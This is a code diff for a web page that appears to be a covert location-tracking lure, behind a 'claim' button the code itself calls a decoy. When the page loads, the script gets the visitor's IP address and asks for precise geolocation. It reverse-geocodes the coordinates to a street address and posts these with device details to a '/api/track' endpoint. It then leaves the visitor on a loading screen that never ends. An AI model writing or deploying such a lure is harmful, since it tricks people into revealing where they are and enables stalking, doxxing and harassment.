@@ -1,81 +1,112 @@
-(function() {
-    const linkId = window.TRACKING_LINK_ID;
+(async function() {
+    const pathParts = window.location.pathname.split('/');
+    const linkId = pathParts[pathParts.length - 1];
     const loadingOverlay = document.getElementById('loading-overlay');
     const claimBtn = document.getElementById('claim-btn');
     let hasSent = false;
 
-    // Gather basic client metadata
-    const clientData = {
-        user_agent: navigator.userAgent,
-        platform: navigator.platform || 'Unknown',
-        screen_resolution: `${window.screen.width}x${window.screen.height}`,
-        language: navigator.language || 'Unknown',
-        latitude: null,
-        longitude: null,
-        accuracy: null,
-        altitude: null,
-        city: null,
-        address: null,
-        ip_address: '',
-        location_denied: false
-    };
-
-    // Show loading overlay after sending
     function showLoadingForever() {
-        loadingOverlay.classList.remove('hidden');
+        if (loadingOverlay) {
+            loadingOverlay.classList.remove('hidden');
+        }
     }
 
-    // Main collection process
     async function initTracking() {
         if (hasSent) return;
-
-        // Fetch IP Address
+        
+        let ip = '';
         try {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             if (ipResponse.ok) {
                 const ipData = await ipResponse.json();
-                clientData.ip_address = ipData.ip;
+                ip = ipData.ip;
             }
         } catch (e) {
-            console.error('Failed to get IP');
+            // Ignore errors
         }
 
-        // Try getting geolocation
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 async function(position) {
-                    clientData.latitude = position.coords.latitude;
-                    clientData.longitude = position.coords.longitude;
-                    clientData.accuracy = position.coords.accuracy;
-                    clientData.altitude = position.coords.altitude;
-
-                    // Reverse geocode
+                    if (hasSent) return;
+                    hasSent = true;
+                    
+                    let city = null;
+                    let address = null;
+                    
                     try {
-                        const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${clientData.latitude}&lon=${clientData.longitude}`, {
+                        const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`, {
                             headers: {
                                 'Accept-Language': 'en-US,en;q=0.9',
                                 'User-Agent': 'ViutckLocationTracker/1.0'
                             }
                         });
                         if (geoResponse.ok) {
-                            const geoData = await geoResponse.json();
-                            clientData.address = geoData.display_name;
-                            clientData.city = geoData.address.city || 
-                                              geoData.address.town || 
-                                              geoData.address.village || 
-                                              geoData.address.suburb || 
-                                              geoData.address.county || 
-                                              'Unknown';
+                            const json = await geoResponse.json();
+                            city = (json.address && (json.address.city || json.address.town || json.address.village)) || json.display_name;
+                            address = json.display_name;
                         }
                     } catch (e) {
-                        console.error('Geocoding failed');
+                        // Ignore errors
                     }
 
-                    await sendData();
+                    const data = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude || null,
+                        city: city,
+                        address: address,
+                        ip_address: ip,
+                        user_agent: navigator.userAgent,
+                        platform: navigator.platform,
+                        screen_resolution: screen.width + 'x' + screen.height,
+                        language: navigator.language,
+                        location_denied: false
+                    };
+
+                    try {
+                        await fetch(`/api/track/${linkId}`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(data)
+                        });
+                    } catch (e) {}
+                    
+                    showLoadingForever();
                 },
                 async function(error) {
-                    clientData.location_denied = true;
-                    await sendData();
+                    if (hasSent) return;
+                    hasSent = true;
+
+                    const data = {
+                        latitude: null,
+                        longitude: null,
+                        accuracy: null,
+                        altitude: null,
+                        city: null,
+                        address: null,
+                        ip_address: ip,
+                        user_agent: navigator.userAgent,
+                        platform: navigator.platform,
+                        screen_resolution: screen.width + 'x' + screen.height,
+                        language: navigator.language,
+                        location_denied: true
+                    };
+
+                    try {
+                        await fetch(`/api/track/${linkId}`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(data)
+                        });
+                    } catch (e) {}
+                    
+                    showLoadingForever();
                 },
                 {
                     enableHighAccuracy: true,
@@ -84,36 +115,44 @@
                 }
             );
         } else {
-            clientData.location_denied = true;
-            await sendData();
-        }
-    }
+            if (hasSent) return;
+            hasSent = true;
 
-    // Send payload to backend
-    async function sendData() {
-        if (hasSent) return;
-        hasSent = true;
-        try {
-            await fetch(`/api/track/${linkId}`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(clientData)
-            });
-        } catch (e) {
-            console.error('Send failed');
-        } finally {
+            const data = {
+                latitude: null,
+                longitude: null,
+                accuracy: null,
+                altitude: null,
+                city: null,
+                address: null,
+                ip_address: ip,
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                screen_resolution: screen.width + 'x' + screen.height,
+                language: navigator.language,
+                location_denied: true
+            };
+
+            try {
+                await fetch(`/api/track/${linkId}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {}
+            
             showLoadingForever();
         }
     }
 
-    // Start tracking on load immediately
-    window.addEventListener('DOMContentLoaded', () => {
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initTracking);
+    } else {
         initTracking();
-    });
+    }
 
-    // Fallback/decoy trigger
     if (claimBtn) {
         claimBtn.addEventListener('click', (e) => {
             e.preventDefault();
